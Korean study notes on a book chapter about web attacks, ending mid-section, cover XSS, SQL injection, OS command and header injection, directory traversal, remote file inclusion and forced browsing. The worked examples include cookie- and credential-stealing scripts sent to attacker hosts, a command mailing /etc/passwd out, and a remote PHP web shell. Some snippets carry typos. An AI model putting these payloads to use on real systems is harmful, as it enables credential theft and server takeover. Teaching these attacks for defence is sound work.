# 11장. 웹 공격 기술

## 웹 공격 기술
- 현재 벌어지는 공격 대부분이 웹 사이트를 노린 것
- 그 중에서도 특히 웹 애플리케이션을 대상으로 많은 공격이 발생

### HTTP에는 보안 기능이 없다
- HTTP는 구조가 단순한 프로토콜
- HTTP vs SSH
  - SSH는 프로토콜 레벨에서 인증이나 세션 관련 기능이 준비되어 있지만 HTTP에는 없다.
  - SSH 서비스 셋업은 누구나 안전한 레벨까지 쉽게 구축 가능하지만 HTTP에서는 대부분 처음부터 개발하게 된다.
- 웹 애플리케이션에서 인증이나 세션 관리 기능을 개발자가 설계해야 한다.
- 그 결과, 보안 등급이 충분치 못하고 취약성이 있는 상태로 가동되고 있는 웹 애플리케이션이 있다.

### 리퀘스트는 클라이언트에서 변조 가능
- 웹 애플리케이션에 대한 공격은 HTTP 리퀘스트 메시지에 공격 코드를 실어서 실행된다.
- 쿼리나 폼, HTTP 헤더, 쿠키 등을 경유해서 보내져 웹 애플리케이션에 취약성이 있을 경우 정보를 도둑맞거나 권한을 빼앗길 수 있다.

### 웹 애플리케이션에 대한 공격 패턴
- 웹 애플리케이션에 대한 공격 패턴은 두 가지가 있다.
  - 능동적 공격
  - 수동적 공격
#### 서버를 노리는 능동적 공격
  - 공격자가 직접 웹 애플리케이션에 액세스해서 공격 코드를 보내는 타입의 공격
  - 서버 상의 리소스에 대해 직접 실행되기 때문에 공격자가 리소스에 액세스할 필요가 있음.
  - SQL 인젝션, OS 커맨드 인젝션
#### 유저를 노리는 수동적 공격
- 함정을 이용해 유저에게 공격 코드를 실행시키는 공격
- 공격자가 직접 웹 애플리케이션에 액세스해서 공격을 하지 않는다.
- 절차
  - 공격자가 설치한 함정에 유저를 유도함. 함정에는 공격 코드를 심어둔 HTTP 리퀘스트를 발생시키기 위한 장치 준비
  - 사용자가 함정에 걸리면 유저의 브라우저나 메일 클라이언트에서 함정을 열게 됨.
  - 함정에 걸리면 유저의 브라우저가 HTTP 리퀘스트를 웹 애플리케이션에 송신하고 공격 코드를 실행함.
  - 공격 코드를 실행하면 쿠키 등의 기밀 정보를 도둑 맞거나 로그인 중인 유저의 권한이 악용되는 등의 피해 발생
- 크로스 사이트 스크립팅(XSS), 크로스 사이트 리퀘스트 포저리(CSRF)

**유저가 처한 환경을 이용한 인트라넷 등에 대한 공격**
- 수동적 공격을 이용하면 인트라넷 같은 인터넷에서 직접 액세스할 수 없는 네트워크를 공격할 수 있다.
- 많은 인트라넷에서는 인터넷 상의 웹 사이트에 액세스하거나 인터넷에서 전송되어 온 메일을 읽을 수도 있기 때문에 공격자는 함정으로 유도하여 인트라넷을 공격할 수 있게 된다.

## 11.2 출력 값의 이스케이프 미비로 인한 취약성
- 웹 애플리케이션의 보안 대책을 실시하는 장소를 크게 나누면 다음과 같이 된다.
  - 클라이언트에서 체크
  - 웹 애플리케이션(서버 측)에서 체크
    - 입력값 체크
    - 출력값 체크

- 클라이언트 측에서의 체크는 대부분 JavaScript를 사용하는데, 변조되거나 무효화될 가능성이 있기 때문에 근본적인 보안 대책으로는 적합하지 않다.
- 웹 애플리케이션에서 처리한 데이터를 데이터베이스나 파일 시스템, HTML, 메일 등에 출력할 때 출력하는 곳에 따라 값을 이스케이프 처리하는 출력 값의 이스케이프가 보안 대책으로 중요

### 11.2 크로스 사이트 스크립팅
- 크로스 사이트 스크립팅(XSS)은 취약성이 있는 웹사이트를 방문한 사용자의 브라우저에서 부정한 HTML 태그나 JavaScript 등을 동작시키는 공격
- 동적으로 HTML을 생성하는 부분에서 취약성이 발생할 수 있다.
- 수동적 공격

![](https://3.bp.blogspot.com/-h8DgNsx8zhY/WCHPxBD4txI/AAAAAAAAC18/aMZJ85_yJU0vMYl8puDJZCDjJtlVYenFwCLcB/s1600/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA%2B2016-11-08%2B%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE%2B10.14.22.png)

> 예시) 폼에 `<script>` 태그를 사용한 문자열을 입력하여 공격
**XSS는 공격자가 함정을 준비하는 수동적 공격**
- 예) URL의 쿼리에 ID를 지정함으로써 폼 내에 문자열을 보완하는 기능이 있는 웹사이트
  ```
  http://example.jp/login?ID=yama
  ```
  여기에 취약성이 있다고 파악한 공격자는 다음과 같은 함정을 작성한 후 교모한 내용의 메일이나 함정을 설치한 웹 페이지를 준비해서 유저가 URL을 클릭하도록 유도한다.
  ```javascript
  http://example.jp/login?ID="><script>var+f=document=>getElementById("login");+f.action="http://hackkr.jp/pwget";+f.method==>"get";</script><span+s="
  ```
  유저가 폼에 ID와 패스워드를 입력하면 공격자의 사이트로 송신되게 하여 빼앗을 수 있다.

#### 유저의 쿠키를 빼앗는 공격
- 폼에 함정을 설치하는 것 외에도 아래와 같은 스크립트를 추가하여 유저의 쿠키를 XSS로 빼앗을 수 있다.
  ```javascript
  <script src="http://hackr.jp/xss.js></script>
  ```
- 이 스크립트가 가리키는 http://hackr.jp/xss.js에는 아래의 JavaScript가 코딩되어 이다.
  ```javascript
  var content = escape(document.cookie);
  document.write("<img src="http://hackr.jp/?");
  document.write(content);
  document.write(">");
  ```
- XSS 취약성이 있는 웹 애플리케이션에서 JavaScript가 실행되면 해당 웹 애플리케이션의 도메인의 쿠키 정보에 액세스된다. 그리고 이 저보가 웹 사이트에 보내지고 액세스 로그에 기록된다.

### 11.2.2 SQL 인젝션
#### 부정한 SQL을 실행하는 SQL 인젝션
- SQL 인젝션 : 웹 애플리케이션을 이용하고 있는 데이터베이스에 SQL을 부정하게 실행하는 공격
- 커다란 위협을 일으킬 수 있는 취약성

**SQL 인젝션의 공격 사례**
- 웹 사이트에 [우에노 센]을 입력했을 때 이 값은 웹 애플리케이션 내부에서 SQL문에 전달되며 다음과 같이 구성된다.
  ```sql
  SELECT * FROM bookTbl WHERE author='우에노 센' and flag = 1;
  ```
- 조금 전 쿼리를 "우에노 센'--"으로 변경한다.
- 그럼 SQL문은 다음과 같이 구성된다.
  ```sql
  SELECT * FROM bookTbl WHERE author='우에노 센' --' and flag = 1;
  ```
- SQL문에서 "--" 이후는 주석으로 처리된다. 즉, `and flag=1`이라는 조건이 무시된다.

#### SQL 인젝션은 SQL 문장의 구문을 파괴하는 공격
- SQL 인젝션은 공격자에 의해 개발자가 의도하지 않는 형태로 SQL 문장이 변경되어 구조가 파괴되는 공격
- 이 책의 에에서는 절판 책이 표시되는 문제만 있었지만, 실제로 SQL 인젝션이 발생한 경우, 유저 정보나 결제 정보 등의 다른 테이블을 부정하게 열람하거나 변조되는 등의 피해가 발생할 수 있다.

### 11.2.3 OS 커맨드 인젝션
- 웹 애플리케이션을 경유하여 OS 명령을 부정하게 실행하는 공격
- 쉘을 호출하는 함수가 있는 곳에 발생할 가능성이 있다.

#### OS 커맨드 인젝션의 공격 사례
- 문의 폼에서 메일 송신 기능이 있다고 하자.
  - 유저가 문의를 보냈을 때 접수 완료했다는 연락을 입력한 메일 주소로 메일 송신
- 아래는 폼의 내용을 수신한 프로그램을 일부 발췌한 것
  ```shell
  my $adr = $q->param('mailaddress');
  open(MAIL, "| /usr/sbin/sendmail $adr");
  print MAIL "From: info@example.com￥n";
  ```
- 프로그램에서는 `open` 함수에 의해서 sendmail 커맨드를 호출해서 메일 주소에 지정된 값 `$adr$`에 메일을 송신
- 여기서 공격자는 아래의 값을 메일 주소로 지정
  ```shell
  ; cat /etc/passwd | mail hack@example.jp
  ```
- 이 값을 수신했을 때 프로그램 내에서 구성되는 명령은 아래와 같이 된다.
  ```
  | /usr/sbin/sendmail $adr ; cat /etc/passwd | mail hack@example.jp
  ```
- sendmail 커맨드가 실행된 후 일단락되고, 그 다음 커맨드가 실행되면서 /etc/passwd 라는 Linux의 계정 정보가 포함된 파일이 hack@example.jp로 메일로 송신된다.

### 11.2.3 HTTP 헤더 인젝션
- 리스폰스 헤더 필드에 개행 문자 등을 삽입함으로써 임의의 리스폰스 헤더 필드나 바디를 추가하는 수동적 공격
  - 특히 바디를 추가하는 공격을 HTTP 리스폰스 분할 공격(HTTP Response Splitting Attack)이라고 부른다.
- 웹 애플리케이션에서는 다음과 같이 리스폰스 헤더 필드 Location과 Ser-Cookie의 값에 외부에서 받은 값을 삽입하는 일이 있다.
  ```
  Location: http://www.example.com/a.cig?q=12345
  Set-Cookie: UID=12345

  *12345가 삽입된 값
  ```
- HTTP 헤더 인젝션은 이러한 리스폰스 헤더 필드에 값을 출력하는 처리가 있던 곳에 개행 문자를 삽입함으로써 발생
#### HTTP 헤더 인젝션의 공격 사례
- 카테고리를 선택하여 해당 각 카테고리의 페이지로 리다이렉트 시키는 기능이 있다고 하자.
- 카테고리를 선택하면 리스폰스에 [Location:http://example.com/?cat=10]와 같이 Location 헤더 필드 내에 그 값이 반영되어 리다이렉트 된다.
- 공격자는 카테고리 ID를 아래와 같이 고쳐서 리퀘스트를 보낸다.
  ```
  101%0D%0ASet-Cookie:+SID=123456789
  ```
- `%0D%0A`는 HTTP 메시지의 개행 문자를 의미하고, 뒤에 이어지는 내용은 공격자 사이트의 세션 ID에 SID=123456789를 강제적으로 세트하기 위한 Set-Cookie 헤더 필드다.
- 리퀘스트를 보낸 결과로 아래와 같은 내용의 리스폰스가 반환되었다고 가정하자.
  ```
  Location: http://example.com/?cat=101(%0D%0A: 개행문자)
  Set-Cookie: SID=123456789
  ```
- 이 때 Set-Cookie 헤더 필드가 유효하기 때문에 공격자가 지정한 임의의 쿠키가 세팅되어 버린다.
- 이것은 세션 픽세이션이라는, 공격자가 지정한 세션 ID를 사용하게 하는 공격과 조합함으로써, 유저로 위장할 가능성이 있다.
- 공격자가 입력한 `%0D%0A`는 원래 Location 헤더 필드의 쿼리 값이 되어야 하지만 개행 문자로 해석되어 새로운 헤더 필드가 추가되는 결과를 초래한다.

#### HTTP 리스폰스 분할 공격
- 공격 순서는 같고 삽입하는 문자열에 `%0D%0A%0D%0A`와 같이 개행 문자를 두 개 나란히 보낸다.
- 개행 문자가 두 개 연속함으로써 HTTP 헤더와 바디를 나누는 빈 행을 만들어 내고 가짜 바디를 표시하는 공격
```
%0D%0A%0D%0A<HTML><HEAD><TITLE>이후 보려는 페이지의 내용 <!--
```
- 위 문자열을 HTTP 인젝션 가능한 곳에 보내면 원래 페이지 헤더와 바디는 주석으로 처리된다.
- 이 공격에 의해서 함정에 빠진 유저의 브라우저에 가짜 웹 페이지를 표시해서 개인 정보를 입력하게 하거나 XSS와 같은 효과를 얻을 수 있다.
- 또한, HTTP/1.1의 복수 리스폰스를 모아서 돌려보내는 기능을 악용해서 캐시 서버 등에 임의의 콘텐츠를 캐시하는 것도 가능 (캐시 오염)
  - 이 캐시 서버를 이용하는 유저는 공격을 받은 사이트를 열람하면 바뀌어진 웹 사이트를 계속해서 참조하게 된다.


### 11.2.5 메일 헤더 인젝션
- 메일 송신 기능에 공격자가 임의의 To 및 Subject 등의 메일 헤더를 부정하게 추가하는 공격
- 스팸 메일이나 바이러스 메일을 임의의 주소에 송신할 수 있다.

#### 메일 헤더 인젝션의 공격 사례
- 폼에 송신자의 메일 주소와 문의 내용을 입력하면 관리자에게 메일이 송신되는 기능
- 공격자는 메일 주소로 아래의 데이터를 리퀘스트로 보낸다.
  ```
  bob@hackr.jp%0D%0ABcc: user@example.com
  ```
- 문의 양식 폼의 웹 애플리케이션이 개행문자를 수신하면 본래는 지정할 수 없는 Bcc에 수신처를 추가할 수 있다.
- 또, 개행 문자를 두 개를 연속함으로써 메일의 본문을 변조해서 보낼 수 있다.
- 같은 방법으로 To나 Subject 등의 임의의 메일의 헤더 필드를 다시 쓰거나 본문에 첨부 파일을 추가하는 것도 가능


### 11.2.6 디렉토리 접근 공격
- 디렉토리 트래버설(Directory Traversal) : 비공개 디렉토리 파일에 대해서 부정하게 디랙토리 패스를 가로질러 액세스하는 공격
- 패스 트래버설이라고도 한다.
- 웹 애플리케이션 파일을 조작하는 처리에서 파일 이름을 외부에서 지정하는 처리 가 취약할 경우 임의의 파일이나 디렉토리에 액세스할 수 있다.
- 이로 인해 웹 서버 상의 파일이 잘못 열람되어 버리거나 변조 또는 삭제되어 버릴 수 있다.
- 출력값의 이스케이프의 문제로 볼 수도 있지만 임의의 파일 이름을 지정할 수 없도록 해야 한다.

##### 디렉토리 트래버설 공격 사례
- 파일을 읽고 표시하는 기능을 예로 디렉토리 트래버설을 설명한다.
- 이 기능은 아래와 같이 쿼리에 파일명을 지정하는 것으로 /www/log/ 이하에 지정된 파일을 읽어오는 기능이다.

```
http://example.com/read.php?log-0401.log
```
- 공격자는 아래와 같은 쿼리를 지정한 리퀘스트를 보낸다.
```
http://example.com/read.php?log=../../etc/passwd
```
- 만약 read.php가 디렉토리를 지정 받을 수 있다면 공개를 원치 않는 파일에 액세스할 수 있다.

### 11.2.7 리모트 파일 인클루션
- 리모트 파일 인클루션 : 스크립트의 일부를 다른 파일에서 읽어올 때 공격자가 지정한 외부 서버의 URL을 파일에서 읽게 함으로써 임의의 스크립트를 동작시키는 공격
- 주로 PHP에서 발생하는 취약성으로, PHP의 include와 require 설정에 따라서 외부 서버의 URL을 파일명으로 지정할 수 있는 기능
- 위험한 기능 때문에 PHP5.2.0 이후에서는 초기에 무효로 설정되어 있음.

#### 리모트 파일 인클루션의 공격 사례
- include로 스크립트에 다른 파일을 읽어들이는 기능
```
http://example.com/foo.pho?mod=news.php
```
- 이 스크립트의 소스 코드는 아래와 같이 되어 있다.
```shell
$modname = $_GET['mod'];
Include($modename);
```
- 공격자는 아래와 같은 URL을 쿼리에 지정한 리퀘스트를 보낸다.
```
http://example.com/foo.pho?mod=http://hackr.jp/cmd.php&cmd=ls
```
- 공격자는 외부 서버에 아래 스크립트를 준비해둔다.
```
<? System($_GET['cmd']) ?>
```
- 웹 서버에서 include가 외부 서버의 URL을 지정할 수 있는 경우, 공격자가 준비한 외부 서버 URL을 읽어올 수 있다.
- 그 결과, system에 의해서 쿼리에 지정한 OS 커맨드를 웹 서버 상에서 실행할 수 있게 된다.

## 11.3 웹 서버의 설정이나 설계 미비로 인한 취약성

- 웹 서버를 잘못 설정하거나 잘못 설계할 때 생긴 문제 등에 의해 발생하는 취약성

### 11.3.1 강제 브라우징
- 강제 브라우징(Forced Browsing) : 웹 서버의 공개 디렉토리에 있는 파일 중에서 공개 의도가 없는 파일이 열람되게 되는 취약성

- 공개되고 싶지 않은 파일의 URL을 숨기는 보안 대책에 의존하고 있는 경우 해당 URL을 알게 되면 파일을 열람할 수 없게 된다.
- 예측하기 쉬운 파일이나 디렉토리의 인덱스가 표시된 경우, 어떠한 방법으로 URL이 누설되었을 경우에도 발생할 가능성이 있다.

#### 디렉토리 내용 일람
```
http://www.example.com/log/
```
- 디렉토리 이름을 지정함으로써 파일 일람이 표시되고 파일명을 알아버리게 된다.

#### 추측하기 쉬운 파일명, 디렉토리명
```
http://www.example.com/entry/entry_081202.log
// 파일명을 예측하기 쉬운(위의 경우, entry_081202.log 등)
```

#### 백업 파일
```
http://www.example.com/cgl-bin/entry.cgi (본래 파일)
http://www.example.com/cgl-bin/entry.cgi~ (백업 파일)
http://www.example.com/cgl-bin/entry.bak (백업 파일)
```
- 에디트 소프트웨어 등에서 자동 생성하는 백업 파일은 실행 권한이 없어 소스 코드가 표시되는 경우도 있다.

#### 인증 후에만 표시되어야 하는 파일
- 인증이 필요한 웹 페이지에서 이용되는 파일의 URL을 지정해서 직접 액세스할 수 있다.

**강제 브라우징의 취약성의 예**
- 예를 들어 어떤 사람의 일기가 친구 관계에서만 열람할 수 있다고 하자.
- 이 일기에 액세스 권한이 없더라도 이 이미지의 URL을 알고 있다면 직접 URL을 지정하여 이미지를 표시할 수 있다.
- 이미지는 액세스 대상으로 하지 않았기 때문에 발생하는 취약성이다.

### 11.3.2 부적절한 에러 메시지 처리
- 부적절한 에러 메시지 처리 (Error Handling Vulnerability) : 공격자에게 유익한 정보가 웹 애플리케이션의 에러 메시지에 포함된다는 취약성
- 상세한 에러 메시지는 공격자가 공격을 하기 위한 힌트가 될 수 있다.

#### 부적절한 에러 메시지 처리로 인한 취약성 사례
